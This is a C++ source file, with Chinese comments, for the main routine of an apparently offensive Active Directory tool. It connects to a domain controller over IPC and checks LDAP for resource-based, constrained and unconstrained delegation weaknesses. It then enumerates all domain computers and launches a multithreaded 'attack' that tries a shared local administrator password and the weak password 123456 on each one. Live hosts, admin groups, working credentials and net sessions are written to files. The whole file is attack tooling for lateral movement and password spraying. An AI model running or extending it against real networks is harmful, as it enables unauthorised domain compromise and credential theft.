#include "WNetApi.h"
#include "CommonApi.h"
#include "multiThread.h"
#include "LdapApi.h"

int wmain(int argc, wchar_t * argv[])
{
	clock_t start, finish;
	double time;
	start = clock();
	

	setlocale(LC_ALL, "");							// 设置中文
    if (argc != 7) {
        wprintf(L"Usage: %s <DC-IP> <DC> <domainname\\username> <password> <nbpassword> <t_num>\n", argv[0]);
		wprintf(L"       %s \\\\域控IP 域控名 域名\\域用户 域用户密码 本地administrator通用密码 多线程数目\n", argv[0]);
        wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei NULL 123456 1\n", argv[0]);
		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\LiWei-PC$ NULL 123456 1\n", argv[0]);
		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei lw123!@#45 123456 1\n", argv[0]);
		wprintf(L"       如果当前用户是域用户，且没有该域用户的密码，则password输入NULL，如果当前用户是域机器的system权限，域用户名为主机名，password输入NULL，如果没有本地administrator通用密码，则nbpassword输入123456\n", argv[0]);
		
        exit(1);
    }

	CommonApi theCommonApi;
	WNetApi theWNetApi;

	LPWSTR lpRemoteName = argv[1];
	LPWSTR lpDCName = argv[2];							// hack.local
	LPWSTR lpDomainUserName = argv[3];					// hack\iis_user
	LPWSTR lpDomainUserPassword = argv[4];
	LPCWSTR lpNbPassword = argv[5];						// 通用密码
	LPCWSTR lpThreadNum = argv[6];

	std::vector<std::wstring> aaa;					// 必须创建vector容器的变量去接收splitString返回的值，不然取出的数据会乱码
	aaa = theCommonApi.splitString(lpDomainUserName, L"\\");
	LPCWSTR lpDomainName = aaa[0].c_str();			// 取出域名  eg:hack
	LPCWSTR lpUserName = aaa[1].c_str();			// 域用户名	eg:iis_user

	int iThreadNum;
	iThreadNum = atoi(theCommonApi.UnicodeToAnsi(lpThreadNum));
	
	HANDLE hAliveFile = theCommonApi.CreateFileApi(L"alive.txt");				// 存活的域机器
	HANDLE hLocalFile = theCommonApi.CreateFileApi(L"local.txt");				// 存活域机器的本地管理组
	HANDLE hSuccessFile = theCommonApi.CreateFileApi(L"success.txt");			// 成功建立IPC连接的域机器，账号密码
	HANDLE hNetSessionsFile = theCommonApi.CreateFileApi(L"NetSessions.txt");	// 每台域机器的net sessions
	HANDLE hDelegFile = theCommonApi.CreateFileApi(L"Deleg.txt");				// 委派漏洞




	std::vector<std::wstring> stdPasswordList;				// 定义密码容器

	// 如果当前用户是域用户，且无该域用户的密码，那么就将该域用户密码设置为NULL
	if (CompareString(GetThreadLocale(), NORM_IGNORECASE, lpDomainUserPassword, lstrlenW(lpDomainUserPassword), L"NULL", lstrlenW(L"NULL")) == CSTR_EQUAL)
	{
		lpDomainUserPassword = NULL;
	}
	

	// 设置本地非administrator管理员用户的弱口令为123456
	int iComp = CompareString(GetThreadLocale(), NORM_IGNORECASE, lpNbPassword, lstrlenW(lpNbPassword), L"123456", lstrlenW(L"123456"));
	if (iComp != CSTR_EQUAL)		// 不相等
	{
		stdPasswordList.push_back(lpNbPassword);				// 本地administrator用户的密码组
		stdPasswordList.push_back(L"123456");
	}
	else {
		stdPasswordList.push_back(L"123456");
	}
	



    wprintf(L"Calling WNetAddConnection2 with\n");
    wprintf(L"  lpDomainName = %s\n", lpDomainName);
    wprintf(L"  lpRemoteName = %s\n", lpRemoteName);
    wprintf(L"  lpDomainUserName = %s\n", lpDomainUserName);
    wprintf(L"  lpDomainUserPassword = %s\n", lpDomainUserPassword);
	wprintf(L"  passwordList = %s\n", lpNbPassword);

	int retNetUse;
	retNetUse = theWNetApi.WNetAddConnection2Api(lpRemoteName, lpDomainUserName, lpDomainUserPassword);			// 和域控建立IPC连接
	if (retNetUse == 0)
	{
		wprintf(L"net use %s error: %d\n", lpRemoteName, GetLastError());
		exit(0);
	}

	// 检测委派漏洞（基于资源的约束委派）
	if (lpDomainUserPassword != NULL){
		wprintf(L"------------------------------------check delegationVul...------------------------------------\n");
		LdapApi theLdapApi(lpDCName, (PWCHAR)lpUserName, (PWCHAR)lpDomainUserPassword, hDelegFile);
		int iConnRet = theLdapApi.connect();
		if (iConnRet != 1) {
			exit(0);
		}
		theLdapApi.RBCD();
		theLdapApi.CD();
		theLdapApi.ud();
	}


	
	// 获取域机器列表
	std::vector<std::wstring> hostnameList;
	hostnameList = theWNetApi.NetGroupGetUsersApi(lpRemoteName, L"Domain Computers");

	wprintf(L"------------------------------------start attack...------------------------------------\n");

	multiThread theMultiThread(lpDomainUserName, lpDomainUserPassword, stdPasswordList, hAliveFile, hLocalFile, hSuccessFile, hNetSessionsFile);		// 实例化多线程类
	
	std::thread * threads = new std::thread[iThreadNum];	// 动态数组

	for (int i = 0; i < iThreadNum; i++)
		threads[i] = std::thread(&multiThread::attack, theMultiThread, i, &hostnameList);

	for (int i = 0; i < iThreadNum; i++)
		threads[i].join();

	delete[] threads;

	finish = clock();												//执行完之后的CPU时间占用值
	time = (double)(finish - start) / (double)CLOCKS_PER_SEC;		//计算时间，单位换算
	printf("%lf s\n", time);		//结果
}